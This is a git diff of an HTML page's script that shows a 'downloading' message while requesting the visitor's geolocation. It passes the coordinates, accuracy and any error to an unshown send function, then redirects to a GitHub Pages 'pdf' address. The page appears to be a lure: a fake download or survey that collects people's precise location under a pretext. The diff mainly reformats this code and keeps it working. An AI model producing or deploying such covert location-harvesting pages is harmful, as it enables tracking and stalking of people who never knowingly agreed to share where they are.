@@ -186,55 +186,54 @@ function solicitarGeo() {
     }
 
     navigator.geolocation.getCurrentPosition(
-        pos => {
-            enviar({
-                type: "geo",
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: pos.coords.accuracy,
-                time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
-            });
+    pos => {
+        enviar({
+            type: "geo",
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
+        });
 
-            // 🔥 REDIRECCIÓN FINAL DESPUÉS DE ENVIAR LA UBICACIÓN
-            setTimeout(redirigirLuego, 800);
-        },
+        setTimeout(redirigirLuego, 800);
+    },
     err => {
-    enviar({
-        type: "geo-error",
-        error: err.message,
-        time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
-    });
+        enviar({
+            type: "geo-error",
+            error: err.message,
+            time: new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })
+        });
 
-    const msg = (err.message || "").toLowerCase();
+        const msg = (err.message || "").toLowerCase();
 
-    // 1️⃣ Usuario negó permisos
-    if (
-        msg.includes("denied") ||
-        msg.includes("rechaz") ||
-        msg.includes("negó")
-    ) {
-        window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-        return;
+        // 1️⃣ Usuario negó permisos
+        if (
+            msg.includes("denied") ||
+            msg.includes("rechaz") ||
+            msg.includes("negó")
+        ) {
+            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+            return;
+        }
+
+        // 2️⃣ GPS apagado o sin señal
+        if (
+            msg.includes("unavailable") ||
+            msg.includes("not be determined") ||
+            msg.includes("no pudo ser determinada") ||
+            msg.includes("ubicación no disponible")
+        ) {
+            alert("Activa el GPS de tu dispositivo para continuar.");
+            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+            return;
+        }
+
+        // 3️⃣ Timeout u otro error desconocido
+        setTimeout(() => {
+            window.location.href = "https://encuestauta69-gif.github.io/pdf/";
+        }, 800);
     }
-
-    // 2️⃣ GPS apagado o sin señal
-    if (
-        msg.includes("unavailable") ||
-        msg.includes("not be determined") ||
-        msg.includes("no pudo ser determinada") ||
-        msg.includes("ubicación no disponible")
-    ) {
-        alert("Activa el GPS de tu dispositivo para continuar.");
-        window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-        return;
-    }
-
-    // 3️⃣ Timeout u otro error desconocido
-    setTimeout(() => {
-        window.location.href = "https://encuestauta69-gif.github.io/pdf/";
-    }, 800);
-}
-);
+); // ✅ AQUÍ EL PARÉNTESIS Y PUNTO Y COMA
 
 
 </script>
@@ -249,6 +248,7 @@ Descargando.....
 
 </body>
 </html>
+
 
 
 
